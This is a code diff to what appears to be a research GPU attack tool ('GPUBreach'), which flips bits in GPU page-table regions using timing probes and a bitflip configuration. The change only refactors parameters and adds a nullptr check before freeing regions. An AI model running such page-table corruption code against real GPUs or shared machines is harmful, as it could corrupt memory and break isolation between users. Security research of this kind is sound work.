@@ -5,11 +5,11 @@
 #include <fstream>
 
 bool
-second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
+second_PT_region (uint64_t num_alloc_init, 
                   double threshold, uint64_t skip, GPUBreachContext &ctx)
 {
   uint8_t *temp;
-  if (!first_PT_region_attack (num_alloc_init, num_alloc_post_msg, threshold,
+  if (!first_PT_region_attack (num_alloc_init, threshold,
                                skip, ctx))
     {
       printf ("Error: First PTC Allocation is wrong\n");
@@ -57,9 +57,9 @@ second_PT_region (uint64_t num_alloc_init, uint64_t num_alloc_post_msg,
       double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
       fourkb_pages.push_back(temp);
     }
-  for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
+  for (uint64_t i = 0; i < region_ptrs.size(); i += 1)
   {
-    if (i != corrupted_id)
+    if (i != corrupted_id && region_ptrs[i] != nullptr)
       cudaFree(region_ptrs[i]);
     gpuErrchk(cudaPeekAtLastError());
   }
@@ -105,12 +105,11 @@ GPUBreachContext
 second_PT_region (int argc, char *argv[])
 {
   const uint64_t num_alloc_init = std::stoll (argv[0]);
-  const uint64_t num_alloc_post_msg = std::stoll (argv[1]);
-  const double threshold = std::stod (argv[2]);
-  const uint64_t skip = std::stoull (argv[3]);
+  const double threshold = std::stod (argv[1]);
+  const uint64_t skip = std::stoull (argv[2]);
   GPUBreachContext ctx;
-  ctx.bitflip_config = GPUBreachContext::BitFlipConfig(argv[4]);
+  ctx.bitflip_config = GPUBreachContext::BitFlipConfig(argv[3]);
 
-  second_PT_region (num_alloc_init, num_alloc_post_msg, threshold, skip, ctx);
+  second_PT_region (num_alloc_init, threshold, skip, ctx);
   return ctx;
 }
